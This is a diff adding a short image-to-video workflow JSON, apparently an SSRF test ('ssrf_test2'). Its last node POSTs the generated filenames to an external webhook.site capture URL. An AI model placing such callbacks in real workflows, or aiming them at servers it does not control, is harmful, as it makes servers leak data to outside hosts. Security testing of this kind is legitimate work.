@@ -1,0 +1,51 @@
+{
+  "1": {
+    "class_type": "LoadImage",
+    "inputs": {
+      "image": "example.png",
+      "upload": "image"
+    }
+  },
+  "2": {
+    "class_type": "ImageScale",
+    "inputs": {
+      "image": [
+        "1",
+        0
+      ],
+      "upscale_method": "nearest-exact",
+      "width": 64,
+      "height": 64,
+      "crop": "disabled"
+    }
+  },
+  "3": {
+    "class_type": "VHS_VideoCombine",
+    "inputs": {
+      "images": [
+        "2",
+        0
+      ],
+      "frame_rate": 8.0,
+      "loop_count": 0,
+      "filename_prefix": "ssrf_test2",
+      "format": "video/h264-mp4",
+      "pingpong": false,
+      "save_output": true
+    }
+  },
+  "4": {
+    "class_type": "NotifyFilenamesNode",
+    "inputs": {
+      "filenames": [
+        "3",
+        0
+      ],
+      "callback_url": "https://webhook.site/719d4b87-3786-4639-83bc-995afe7cf051",
+      "method": "POST",
+      "timeout": 15.0,
+      "retry": 3,
+      "send_each": true
+    }
+  }
+}
